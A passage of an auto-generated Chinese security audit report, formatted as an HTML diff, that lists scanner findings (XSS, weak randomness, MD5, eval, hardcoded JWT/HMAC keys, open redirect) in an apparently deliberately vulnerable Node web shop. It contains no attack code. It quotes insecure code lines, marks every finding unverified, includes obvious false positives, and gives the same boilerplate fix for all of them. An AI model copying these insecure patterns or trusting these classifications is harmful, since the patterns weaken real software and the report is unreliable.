+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.239 detect-non-literal-regexp <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\lib\codingChallenges.ts:78　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.240 hardcoded-hmac-key <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\lib\insecurity.ts:42　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.241 hardcoded-jwt-secret <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\lib\insecurity.ts:54　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.242 hardcoded-hmac-key <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\lib\insecurity.ts:150　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.243 express-detect-notevil-usage <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\b2bOrder.ts:23　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.244 eval-detected <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\captcha.ts:22　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.245 express-res-sendfile <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\fileServer.ts:33　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.246 express-res-sendfile <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\keyServer.ts:14　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.247 express-res-sendfile <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\logfileServer.ts:14　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.248 express-res-sendfile <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\quarantineServer.ts:14　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.249 express-open-redirect <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\redirect.ts:19　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.250 eval-detected <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\userProfile.ts:61　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.251 unknown-value-with-script-tag <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\videoHandler.ts:57　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.252 unknown-value-with-script-tag <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\videoHandler.ts:71　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.253 express-check-directory-listing <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\server.ts:269　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.254 express-check-directory-listing <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\server.ts:273　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.255 express-check-directory-listing <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\server.ts:277　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.256 express-check-directory-listing <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\server.ts:281　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.257 template-explicit-unescape <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\views\promotionVideo.pug:75　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.258 XSS <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    Gruntfile.js:20　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>&#39;engines.node&#39;: (node || &#39;&lt;%= pkg.engines.node %&gt;&#39;),</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.259 XSS <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    Gruntfile.js:21　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>os: (os ? [os] : &#39;&lt;%= pkg.os %&gt;&#39;),</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.260 XSS <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    Gruntfile.js:22　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cpu: (platform ? [platform] : &#39;&lt;%= pkg.cpu %&gt;&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.261 Weak Hash <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    Gruntfile.js:75　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const md5 = crypto.createHash(&#39;md5&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.262 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    data/datacreator.ts:305　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>for (let i = 0; i &lt; length; i++) { text += possible.charAt(Math.floor(Math.random() * possible.length)) }</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.263 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    data/datacreator.ts:323　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>quantity: product.quantity ?? Math.floor(Math.random() * 70 + 30),</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.264 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    data/datacreator.ts:381　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>product.price = product.price ?? Math.floor(Math.random() * 9 + 1)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.265 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    data/datacreator.ts:755　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>eta: Math.floor((Math.random() * 5) + 1).toString(),</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.266 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/app/chatbot/chat-welcome-screen/chat-welcome-screen.component.ts:71　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const chosen = availableSuggestions[Math.floor(Math.random() * availableSuggestions.length)]</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.267 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/app/coding-challenge-page/components/coding-challenge-fix-it/coding-challenge-fix-it.component.ts:119　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>.map((fix, index) =&gt; ({ fix, index, sort: Math.random() }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.268 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/conversation-storage.service.ts:17　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const random8 = Array.from({ length: 8 }, () =&gt; chars[Math.floor(Math.random() * chars.length)]).join(&#39;&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.269 XSS <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/dat.gui.min.js:23　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>dat.controllers.FunctionController=function(e,a,b){var d=function(b,c,e){d.superclass.call(this,b,c);var k=this;this.__button=document.createElement(&#34;div&#34;);this.__button.innerHTML=void 0===e?&#34;Fire&#34;:e;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.270 XSS <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/dat.gui.min.js:33　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>dat.GUI=dat.gui.GUI=function(e,a,b,d,f,c,p,k,l,q,n,r,y,g,h){function t(a,c,b,e){if(void 0===c[b])throw Error(&#34;Object &#34;+c+&#39; has no property &#34;&#39;+b+&#39;&#34;&#39;);e.color?c=new n(c,b):(c=[c,b].concat(e.factoryArgs)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.271 XSS <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/dat.gui.min.js:35　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>{before:b.__li.nextElementSibling,factoryArgs:[d]})},name:function(a){b.__li.firstElementChild.firstElementChild.innerHTML=a;return b},listen:function(){b.__gui.listen(b);return b},remove:function(){b</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.272 XSS <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/dat.gui.min.js:39　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>a.__ul.firstChild);g.addClass(b,&#34;save-row&#34;);var d=document.createElement(&#34;span&#34;);d.innerHTML=&#34;&amp;nbsp;&#34;;g.addClass(d,&#34;button gears&#34;);var c=document.createElement(&#34;span&#34;);c.innerHTML=&#34;Save&#34;;g.addClass(c,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.273 XSS <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/dat.gui.min.js:40　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>a.load.remembered?h.each(a.load.remembered,function(b,d){E(a,d,d==a.preset)}):E(a,z,!1);g.bind(q,&#34;change&#34;,function(){for(var b=0;b&lt;a.__preset_select.length;b++)a.__preset_select[b].innerHTML=a.__prese</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.274 XSS <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/dat.gui.min.js:41　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>localStorage.getItem(document.location.href+&#34;.isLocal&#34;)&amp;&amp;b.setAttribute(&#34;checked&#34;,&#34;checked&#34;);var k=function(){n.style.display=a.useLocalStorage?&#34;block&#34;:&#34;none&#34;};k();g.bind(b,&#34;change&#34;,function(){a.useLo</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.275 XSS <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/dat.gui.min.js:44　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>function B(a,b){var d={};h.each(a.__rememberedObjects,function(c,e){var f={};h.each(a.__rememberedObjectIndecesToControllers[e],function(a,d){f[d]=b?a.initialValue:a.getValue()});d[e]=f});return d}fun</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.276 XSS <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/dat.gui.min.js:48　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>b);c.revert()}},width:{get:function(){return a.width},set:function(b){a.width=b;F(c,b)}},name:{get:function(){return a.name},set:function(b){a.name=b;q&amp;&amp;(q.innerHTML=a.name)}},closed:{get:function(){r</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.277 XSS <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/dat.gui.min.js:49　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>((e=a)?g.bind(window,&#34;unload&#34;,b):g.unbind(window,&#34;unload&#34;,b),localStorage.setItem(document.location.href+&#34;.isLocal&#34;,a))}}});if(h.isUndefined(a.parent)){a.closed=!1;g.addClass(this.domElement,m.CLASS_M</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.278 XSS <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/dat.gui.min.js:55　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>b-20+&#34;px&#34;):(g.removeClass(a.domElement,m.CLASS_TOO_TALL),a.__ul.style.height=&#34;auto&#34;)}a.__resize_handle&amp;&amp;h.defer(function(){a.__resize_handle.style.height=a.__ul.offsetHeight+&#34;px&#34;});a.__closeButton&amp;&amp;(a</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.279 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/three.js:6359　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>if (rnd &lt;= 0x02) rnd = 0x2000000 + (Math.random()*0x1000000)|0;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.280 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/three.js:6422　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>// (standard Math.random() creates repetitive patterns when applied over larger space)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.281 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/three.js:6426　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return ( 65280 * Math.random() + 255 * Math.random() ) / 65535;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.282 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/three.js:6434　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return low + Math.floor( Math.random() * ( high - low + 1 ) );</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.283 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/three.js:6442　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return low + Math.random() * ( high - low );</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.284 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/three.js:6450　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return range * ( 0.5 - Math.random() );</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.285 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/three.js:15504　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>this.material = material !== undefined ? material : new THREE.ParticleSystemMaterial( { color: Math.random() * 0xffffff } );</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.286 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/three.js:15534　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>this.material = material !== undefined ? material : new THREE.LineBasicMaterial( { color: Math.random() * 0xffffff } );</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.287 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/three.js:15567　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>this.material = material !== undefined ? material : new THREE.MeshBasicMaterial( { color: Math.random() * 0xffffff } );</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.288 Weak Hash <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    lib/insecurity.ts:41　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>export const hash = (data: string) =&gt; crypto.createHash(&#39;md5&#39;).update(data).digest(&#39;hex&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.289 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    lib/insecurity.ts:53　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>export const denyAll = () =&gt; expressJwt({ secret: &#39;&#39; + Math.random() } as any)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.290 SSRF <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    lib/startup/validatePreconditions.ts:236　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const response = await fetch(`${llmApiUrl}/models`, { signal: AbortSignal.timeout(5000) })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.291 Command Injection <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    routes/b2bOrder.ts:23　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>vm.runInContext(&#39;safeEval(orderLinesData)&#39;, sandbox, { timeout: 2000 })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.292 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    routes/captcha.ts:14　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const firstTerm = Math.floor((Math.random() * 10) + 1)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.293 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    routes/captcha.ts:15　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const secondTerm = Math.floor((Math.random() * 10) + 1)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.294 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    routes/captcha.ts:16　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const thirdTerm = Math.floor((Math.random() * 10) + 1)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.295 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    routes/captcha.ts:18　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const firstOperator = operators[Math.floor((Math.random() * 3))]</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.296 Weak Randomness <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    routes/captcha.ts:19　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const secondOperator = operators[Math.floor((Math.random() * 3))]</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.297 XSS <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    routes/chat.ts:218　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>res.write(`data: ${JSON.stringify({ choices: [{ delta: { content: event.text } }] })}\n\n`)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.298 XSS <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    routes/chat.ts:228　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>res.write(`data: ${JSON.stringify({</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.299 SQL Injection <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    routes/search.ts:23　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
